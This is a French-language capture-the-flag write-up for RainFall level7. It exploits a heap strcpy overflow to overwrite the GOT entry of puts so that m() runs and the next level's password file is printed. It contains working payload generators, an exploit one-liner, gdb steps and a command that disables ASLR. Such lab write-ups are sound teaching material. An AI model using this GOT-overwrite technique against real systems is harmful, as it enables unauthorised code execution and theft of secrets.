# Exploit guide — level7 (RainFall)

> But : écraser le champ pointeur `puVar3[1]` via un `strcpy` overflow et rediriger l'exécution vers `m()` en patchant la GOT de `puts`.

---

## 1. Résumé rapide

* Le binaire alloue 4 chunks `malloc(8)` : deux structures (A, B) et deux petits buffers.
* Layout probable (croissant) : `struct A (8)` → `bufferA (8)` → `struct B (8)` → `bufferB (8)`.
* `strcpy(bufferA, argv[1])` est vulnérable : overflow contrôlable.
* Objectif : utiliser `argv[1]` pour écrire l'adresse de l'entrée GOT de `puts` dans `puVar3[1]`, puis utiliser `argv[2]` pour écrire l'adresse de `m()` dans cette GOT entry. Quand `puts` sera appelé, il exécutera `m()` et affichera le contenu de `/home/user/level8/.pass`.

---

## 2. Prérequis / vérifications

1. Vérifier l'architecture (ici i386, little-endian).
2. Vérifier protections : `checksec --file=./level7` ou `readelf -l ./level7`.

   * Si **Full RELRO** => GOT en R/O (méthode échoue). Si pas Full RELRO, la technique GOT overwrite fonctionne.
3. Avoir gdb et python2 disponibles localement (RainFall utilise python2).

---

## 3. Adresses observées (session fournie)

* `bufferA = 0x804a018`  (puVar1[1])
* `structB = 0x804a028`  (puVar3)
* `puVar3[1]` (champ pointer) = `0x804a028 + 4 = 0x804a02c`
* `&m = 0x080484f4`

Calcul : `0x804a02c - 0x804a018 = 0x14` => **20 bytes** de padding pour atteindre le champ pointer.

---

## 4. Méthode (GOT hijack en 2 étapes)

1. `argv[1] = 'A'*20 + pack32(GOT_puts)` → écrase `puVar3[1]` et la remplace par l'adresse de l'entrée GOT de `puts`.
2. `argv[2] = pack32(addr_m)` → la seconde `strcpy` devient `strcpy(GOT_puts, argv[2])`, écrivant `addr_m` dans la GOT de `puts`.
3. Quand le programme appellera `puts`, il exécutera `m()`.

---

## 5. Commandes utiles (copier-coller)

### Trouver l'adresse GOT de `puts`

```bash
# objdump / readelf
objdump -R ./level7 | grep puts
# ou
readelf -r ./level7 | grep -i puts
```

### Générer les payloads (exemples)

Remplace `GOT_PUTS` par l'adresse réelle trouvée ci-dessus.

```bash
# payload1 : overwrite puVar3[1] avec adresse GOT_puts
python2 - <<'PY'
import struct
GOT_PUTS = 0x08049xxx   # <-- remplace
payload1 = b"A"*20 + struct.pack("<I", GOT_PUTS)
open("arg1.bin","wb").write(payload1)
print("arg1 len=", len(payload1))
PY

# payload2 : valeur à écrire dans GOT_puts (addr de m)
python2 - <<'PY'
import struct
ADDR_M = 0x080484f4
payload2 = struct.pack("<I", ADDR_M)
open("arg2.bin","wb").write(payload2)
print("arg2 len=", len(payload2))
PY

# Lance le binaire
./level7 "$(cat arg1.bin)" "$(cat arg2.bin)"
```

### Vérifier sous GDB

```bash
gdb --args ./level7 "$(cat arg1.bin)" "$(cat arg2.bin)"
# dans gdb
break *0x080485a5   # juste après le 1er strcpy (adresse selon disas)
run
# vérifier la GOT entry
x/1wx 0xADDR_GOT_PUTS   # doit afficher 0x080484f4
```

---

## 6. Exemples observés

Tu as testé et obtenu :

```
./level7 "$(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')" "$(python -c 'print "\xf4\x84\x04\x08"')"
```

Résultat affiché : contenu du `.pass` suivi d'un timestamp — preuve que l'exploit a réussi dans ton environnement.

---

## 7. Diagnostic des comportements observés

* `A*16` écrase `structB.id` (non fatal) => programme s'exécute normalement.
* `A*17` provoque un écrasement non aligné partiel du pointeur → corruption et segfault lors de la seconde `strcpy` (libc). Eviter les tailles intermédiaires non alignées.
* `A*20` écrit proprement le pointeur (offset calculé correctement).

---

## 8. Sécurité & bonnes pratiques

* Ne teste ces payloads que sur des binaires que tu possèdes ou dans un environnement CTF/VM isolé.
* Si ASLR est activé, les adresses heap changent ; désactive ASLR pour debug local (`echo 0 > /proc/sys/kernel/randomize_va_space`) ou récupère les adresses à chaque run via gdb.
* Si le binaire a Full RELRO, la GOT est en R/O et la technique de GOT overwrite échouera.

---

## 9. Conclusion

La technique GOT-overwrite via double-`strcpy` est propre et reproductible ici :

* padding 20 bytes pour atteindre `puVar3[1]` ;
* écrire l'adresse GOT de `puts` ;
* utiliser la 2ème écriture pour y déposer l'adresse `m()` ;
* laisser `puts` être appelé => exécution de `m()` et leak du `.pass`.

---